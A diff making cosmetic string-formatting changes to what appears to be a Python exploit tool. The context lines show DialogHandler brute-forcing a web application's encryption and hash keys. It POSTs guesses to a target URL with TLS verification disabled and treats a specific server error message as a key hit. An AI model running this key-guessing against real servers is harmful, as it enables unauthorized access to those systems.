@@ -293,6 +293,7 @@ class AsyncUpload:
                         session = requests.Session()
                         if self.proxies:
                             session.proxies.update(self.proxies)
+
                         request = requests.Request("POST", self.url, data=data)
                         request = request.prepare()
                         request.headers["Content-Type"] = (
@@ -414,7 +415,8 @@ class DialogHandler:
                     res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
 
                     if encryptionkey_counter % 1000 == 0:
-                        print(f"Tested {str(encryptionkey_counter)} encryption keys so far...")
+                        print(f"Tested {encryptionkey_counter} encryption keys so far...")
+
                     if "Index was outside the bounds of the array" in res.text:
                         print(f"Found Encryption key! [{encryption_key}]")
                         self.encryption_key = encryption_key
@@ -451,7 +453,7 @@ class DialogHandler:
                         self.hash_key = hash_key
                         break
                     if count % 1000 == 0:
-                        print(f"Tested {str(count)} hash key / encryption key combinations so far...")
+                        print(f"Tested {count} hash key / encryption key combinations so far...")
 
                 if self.hash_key:
                     break
